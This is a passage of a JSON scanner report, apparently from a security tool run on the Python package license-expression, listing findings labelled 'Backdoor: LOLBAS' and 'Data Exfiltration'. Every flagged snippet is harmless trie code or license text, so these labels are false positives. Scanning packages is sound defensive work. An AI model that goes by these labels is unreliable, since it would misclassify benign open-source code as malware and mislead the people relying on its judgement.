            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 130,
                  "startColumn": 15,
                  "endLine": 130,
                  "endColumn": 21,
                  "snippet": {
                    "text": "            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n                node = child\n\n        node.output = (tokens_string, value or tokens_string)\n\n",
                    "rendered": {
                      "text": "            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n                node = child\n\n        node.output = (tokens_string, value or tokens_string)\n\n",
                      "markdown": "`            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n                node = child\n\n        node.output = (tokens_string, value or tokens_string)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 126,
                  "startColumn": 15,
                  "endLine": 126,
                  "endColumn": 21,
                  "snippet": {
                    "text": "        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n",
                    "rendered": {
                      "text": "        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n",
                      "markdown": "`        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n            except KeyError:\n                child = TrieNode(token)\n                node.children[token] = child\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 7,
                  "endLine": 123,
                  "endColumn": 13,
                  "snippet": {
                    "text": "\n        self._known_tokens.update(tokens)\n\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n",
                    "rendered": {
                      "text": "\n        self._known_tokens.update(tokens)\n\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n",
                      "markdown": "`\n        self._known_tokens.update(tokens)\n\n        node = self.root\n        for token in tokens:\n            try:\n                node = node.children[token]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 26,
                  "endLine": 68,
                  "endColumn": 32,
                  "snippet": {
                    "text": "        # failure link used by the Aho-Corasick automaton and its search procedure\n        self.fail = nil\n\n        # children of this node as a mapping of char->node\n        self.children = {}\n\n    def __repr__(self):\n",
                    "rendered": {
                      "text": "        # failure link used by the Aho-Corasick automaton and its search procedure\n        self.fail = nil\n\n        # children of this node as a mapping of char->node\n        self.children = {}\n\n    def __repr__(self):\n",
                      "markdown": "`        # failure link used by the Aho-Corasick automaton and its search procedure\n        self.fail = nil\n\n        # children of this node as a mapping of char->node\n        self.children = {}\n\n    def __repr__(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 61,
                  "startColumn": 70,
                  "endLine": 61,
                  "endColumn": 76,
                  "snippet": {
                    "text": "\n        # an output function (in the Aho-Corasick meaning) for this node: this\n        # is an object that contains the original key string and any\n        # additional value data associated to that key. Or \"nil\" for a node that\n        # is not a terminal leave for a key. It will be returned with a match.\n        self.output = output\n\n",
                    "rendered": {
                      "text": "\n        # an output function (in the Aho-Corasick meaning) for this node: this\n        # is an object that contains the original key string and any\n        # additional value data associated to that key. Or \"nil\" for a node that\n        # is not a terminal leave for a key. It will be returned with a match.\n        self.output = output\n\n",
                      "markdown": "`\n        # an output function (in the Aho-Corasick meaning) for this node: this\n        # is an object that contains the original key string and any\n        # additional value data associated to that key. Or \"nil\" for a node that\n        # is not a terminal leave for a key. It will be returned with a match.\n        self.output = output\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 51,
                  "startColumn": 3,
                  "endLine": 51,
                  "endColumn": 9,
                  "snippet": {
                    "text": "\nclass TrieNode(object):\n    \"\"\"\n    Node of the Trie/Aho-Corasick automaton.\n    \"\"\"\n    __slots__ = ['token', 'output', 'fail', 'children']\n\n",
                    "rendered": {
                      "text": "\nclass TrieNode(object):\n    \"\"\"\n    Node of the Trie/Aho-Corasick automaton.\n    \"\"\"\n    __slots__ = ['token', 'output', 'fail', 'children']\n\n",
                      "markdown": "`\nclass TrieNode(object):\n    \"\"\"\n    Node of the Trie/Aho-Corasick automaton.\n    \"\"\"\n    __slots__ = ['token', 'output', 'fail', 'children']\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 340,
                  "startColumn": 34,
                  "endLine": 340,
                  "endColumn": 39,
                  "snippet": {
                    "text": "                state = state.fail\n\n            # we have a matching starting token_string\n            state = state.children.get(token_string, self.root)\n            match = state\n            while match is not nil:\n                if match.output is not nil:\n",
                    "rendered": {
                      "text": "                state = state.fail\n\n            # we have a matching starting token_string\n            state = state.children.get(token_string, self.root)\n            match = state\n            while match is not nil:\n                if match.output is not nil:\n",
                      "markdown": "`                state = state.fail\n\n            # we have a matching starting token_string\n            state = state.children.get(token_string, self.root)\n            match = state\n            while match is not nil:\n                if match.output is not nil:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/_pyahocorasick.py"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 42,
                  "endLine": 250,
                  "endColumn": 47,
                  "snippet": {
                    "text": "                state = current_node.fail\n                while node.token not in state.children:\n                    state = state.fail\n                node.fail = state.children.get(node.token, self.root)\n\n        # Mark the trie as converted so it cannot be modified anymore\n        self._converted = True\n",
                    "rendered": {
                      "text": "                state = current_node.fail\n                while node.token not in state.children:\n                    state = state.fail\n                node.fail = state.children.get(node.token, self.root)\n\n        # Mark the trie as converted so it cannot be modified anymore\n        self._converted = True\n",
                      "markdown": "`                state = current_node.fail\n                while node.token not in state.children:\n                    state = state.fail\n                node.fail = state.children.get(node.token, self.root)\n\n        # Mark the trie as converted so it cannot be modified anymore\n        self._converted = True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 39,
                  "endLine": 194,
                  "snippet": {
                    "text": "\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`\n   Licensed under the Apache License, Version 2.0 (the \"License\");\n   you may not use this file except in compliance with the License.\n   You may obtain a copy of the License at\n\n       http://www.apache.org/licenses/LICENSE-2.0\n\n   Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 110,
                  "startColumn": 57,
                  "endLine": 110,
                  "endColumn": 61,
                  "snippet": {
                    "text": "          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n",
                    "rendered": {
                      "text": "          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n",
                      "markdown": "`          distribution, then any Derivative Works that You distribute must\n          include a readable copy of the attribution notices contained\n          within such NOTICE file, excluding those notices that do not\n          pertain to any part of the Derivative Works, in at least one\n          of the following places: within a NOTICE text file distributed\n          as part of the Derivative Works; within the Source form or\n          documentation, if provided along with the Derivative Works; or,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 56,
                  "startColumn": 60,
                  "endLine": 56,
                  "endColumn": 69,
                  "snippet": {
                    "text": "      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n",
                    "rendered": {
                      "text": "      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n",
                      "markdown": "`      the copyright owner. For the purposes of this definition, \"submitted\"\n      means any form of electronic, verbal, or written communication sent\n      to the Licensor or its representatives, including but not limited to\n      communication on electronic mailing lists, source code control systems,\n      and issue tracking systems that are managed by, or on behalf of, the\n      Licensor for the purpose of discussing and improving the Work, but\n      excluding communication that is conspicuously marked or otherwise\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 17,
                  "startColumn": 5,
                  "endLine": 17,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n",
                    "rendered": {
                      "text": "\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n",
                      "markdown": "`\n      \"Legal Entity\" shall mean the union of the acting entity and all\n      other entities that control, are controlled by, or are under common\n      control with that entity. For the purposes of this definition,\n      \"control\" means (i) the power, direct or indirect, to cause the\n      direction or management of such entity, whether by contract or\n      otherwise, or (ii) ownership of fifty percent (50%) or more of the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/apache-2.0.LICENSE"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 24,
                  "endLine": 139,
                  "endColumn": 33,
                  "snippet": {
                    "text": "      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n",
                    "rendered": {
                      "text": "      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n",
                      "markdown": "`      with Licensor regarding such Contributions.\n\n   6. Trademarks. This License does not grant permission to use the trade\n      names, trademarks, service marks, or product names of the Licensor,\n      except as required for reasonable and customary use in describing the\n      origin of the Work and reproducing the content of the NOTICE file.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/NOTICE"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 38,
                  "endLine": 20,
                  "snippet": {
                    "text": "\n# you may not use this file except in compliance with the License.\n\n# You may obtain a copy of the License at\n\n#\n\n# http://www.apache.org/licenses/LICENSE-2.0\n",
                    "rendered": {
                      "text": "\n# you may not use this file except in compliance with the License.\n\n# You may obtain a copy of the License at\n\n#\n\n# http://www.apache.org/licenses/LICENSE-2.0\n",
                      "markdown": "`\n# you may not use this file except in compliance with the License.\n\n# You may obtain a copy of the License at\n\n#\n\n# http://www.apache.org/licenses/LICENSE-2.0\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CODE_OF_CONDUCT.rst"
                },
                "region": {
                  "startLine": 83,
                  "startColumn": 22,
                  "endLine": 84,
                  "snippet": {
                    "text": "-----------\n\nThis Code of Conduct is adapted from the `Contributor Covenant`_ ,\nversion 1.4, available at\nhttps://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n.. _Contributor Covenant: https://www.contributor-covenant.org\n",
                    "rendered": {
                      "text": "-----------\n\nThis Code of Conduct is adapted from the `Contributor Covenant`_ ,\nversion 1.4, available at\nhttps://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n.. _Contributor Covenant: https://www.contributor-covenant.org\n",
                      "markdown": "`-----------\n\nThis Code of Conduct is adapted from the `Contributor Covenant`_ ,\nversion 1.4, available at\nhttps://www.contributor-covenant.org/version/1/4/code-of-conduct.html\n\n.. _Contributor Covenant: https://www.contributor-covenant.org\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CODE_OF_CONDUCT.rst"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 29,
                  "endLine": 68,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\nThe project team is obligated to maintain confidentiality with regard to\n",
                    "rendered": {
                      "text": "\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\nThe project team is obligated to maintain confidentiality with regard to\n",
                      "markdown": "`\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\nThe project team is obligated to maintain confidentiality with regard to\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CODE_OF_CONDUCT.rst"
                },
                "region": {
                  "startLine": 67,
                  "startColumn": 42,
                  "endLine": 67,
                  "endColumn": 46,
                  "snippet": {
                    "text": "-----------\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\n",
                    "rendered": {
                      "text": "-----------\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\n",
                      "markdown": "`-----------\n\nInstances of abusive, harassing, or otherwise unacceptable behavior may\nbe reported by contacting the project team at pombredanne@gmail.com\nor on the Gitter chat channel at https://gitter.im/aboutcode-org/discuss .\nAll complaints will be reviewed and investigated and will result in a\nresponse that is deemed necessary and appropriate to the circumstances.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression-30.3.0.dist-info/CODE_OF_CONDUCT.rst"
                },
                "region": {
                  "startLine": 59,
                  "startColumn": 49,
                  "endLine": 59,
                  "endColumn": 53,
                  "snippet": {
                    "text": "spaces when an individual is representing the project or its community.\nExamples of representing a project or community include using an\nofficial project e-mail address, posting via an official social media\naccount, or acting as an appointed representative at an online or\noffline event. Representation of a project may be further defined and\nclarified by project maintainers.\n\n",
                    "rendered": {
                      "text": "spaces when an individual is representing the project or its community.\nExamples of representing a project or community include using an\nofficial project e-mail address, posting via an official social media\naccount, or acting as an appointed representative at an online or\noffline event. Representation of a project may be further defined and\nclarified by project maintainers.\n\n",
                      "markdown": "`spaces when an individual is representing the project or its community.\nExamples of representing a project or community include using an\nofficial project e-mail address, posting via an official social media\naccount, or acting as an appointed representative at an online or\noffline event. Representation of a project may be further defined and\nclarified by project maintainers.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 395,
                  "startColumn": 33,
                  "endLine": 395,
                  "endColumn": 37,
                  "snippet": {
                    "text": "the avoidance of doubt, this paragraph does not form part of the\npublic licenses.\n\nCreative Commons may be contacted at creativecommons.org.\n",
                    "rendered": {
                      "text": "the avoidance of doubt, this paragraph does not form part of the\npublic licenses.\n\nCreative Commons may be contacted at creativecommons.org.\n",
                      "markdown": "`the avoidance of doubt, this paragraph does not form part of the\npublic licenses.\n\nCreative Commons may be contacted at creativecommons.org.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 385,
                  "startColumn": 62,
                  "endLine": 386,
                  "snippet": {
                    "text": "public licenses is dedicated to the public domain under the CC0 Public\nDomain Dedication. Except for the limited purpose of indicating that\nmaterial is shared under a Creative Commons public license or as\notherwise permitted by the Creative Commons policies published at\ncreativecommons.org/policies, Creative Commons does not authorize the\nuse of the trademark \"Creative Commons\" or any other trademark or logo\nof Creative Commons without its prior written consent including,\nwithout limitation, in connection with any unauthorized modifications\n",
                    "rendered": {
                      "text": "public licenses is dedicated to the public domain under the CC0 Public\nDomain Dedication. Except for the limited purpose of indicating that\nmaterial is shared under a Creative Commons public license or as\notherwise permitted by the Creative Commons policies published at\ncreativecommons.org/policies, Creative Commons does not authorize the\nuse of the trademark \"Creative Commons\" or any other trademark or logo\nof Creative Commons without its prior written consent including,\nwithout limitation, in connection with any unauthorized modifications\n",
                      "markdown": "`public licenses is dedicated to the public domain under the CC0 Public\nDomain Dedication. Except for the limited purpose of indicating that\nmaterial is shared under a Creative Commons public license or as\notherwise permitted by the Creative Commons policies published at\ncreativecommons.org/policies, Creative Commons does not authorize the\nuse of the trademark \"Creative Commons\" or any other trademark or logo\nof Creative Commons without its prior written consent including,\nwithout limitation, in connection with any unauthorized modifications\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/python/py3-license-expression-30.3.0-r0.apk/py3-license-expression-30.3.0-r0/usr/lib/python3.12/site-packages/license_expression/data/cc-by-4.0.LICENSE"
                },
                "region": {
                  "startLine": 335,
                  "startColumn": 39,
                  "endLine": 335,
                  "endColumn": 43,
                  "snippet": {
                    "text": "\n  c. For the avoidance of doubt, the Licensor may also offer the\n     Licensed Material under separate terms or conditions or stop\n     distributing the Licensed Material at any time; however, doing so\n     will not terminate this Public License.\n\n  d. Sections 1, 5, 6, 7, and 8 survive termination of this Public\n",
                    "rendered": {
                      "text": "\n  c. For the avoidance of doubt, the Licensor may also offer the\n     Licensed Material under separate terms or conditions or stop\n     distributing the Licensed Material at any time; however, doing so\n     will not terminate this Public License.\n\n  d. Sections 1, 5, 6, 7, and 8 survive termination of this Public\n",
                      "markdown": "`\n  c. For the avoidance of doubt, the Licensor may also offer the\n     Licensed Material under separate terms or conditions or stop\n     distributing the Licensed Material at any time; however, doing so\n     will not terminate this Public License.\n\n  d. Sections 1, 5, 6, 7, and 8 survive termination of this Public\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
